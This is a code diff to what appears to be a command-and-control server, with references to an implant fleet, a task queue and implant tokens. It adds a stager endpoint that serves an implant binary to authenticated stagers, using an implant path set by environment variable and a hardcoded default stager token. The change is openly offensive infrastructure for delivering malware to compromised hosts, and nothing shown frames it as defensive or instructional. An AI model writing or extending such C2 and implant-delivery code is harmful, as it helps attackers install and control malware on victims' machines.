@@ -8,6 +8,7 @@ import { getDb, closeDb } from "./db.js";
 import { FleetRegistry } from "./fleet.js";
 import { TaskQueue } from "./taskQueue.js";
 import { createRouter } from "./api.js";
+import { createStagerRouter } from "./stager.js";
 import { createWsBroadcaster } from "./ws.js";
 import type { C2ServerConfig } from "../types.js";
 
@@ -54,6 +55,12 @@ export function startServer(cfg: Partial<C2ServerConfig> = {}): { close: () => v
 
   // WebSocket broadcast (attached to the same HTTP server)
   const broadcast = createWsBroadcaster(httpServer, config.apiKey);
+
+  // Stager endpoint (serves implant binary to authenticated stagers)
+  const implantPath = process.env.C2_IMPLANT_PATH || join(__dirname, "..", "..", "..", "implant", "implant");
+  const stagerToken = process.env.C2_STAGER_TOKEN || "stag3r-t0k3n-change";
+  const stagerRouter = createStagerRouter(implantPath, stagerToken);
+  app.use(stagerRouter);
 
   // Routes with broadcast capability
   const router = createRouter(registry, taskQueue, config.apiKey, config.implantToken, broadcast);
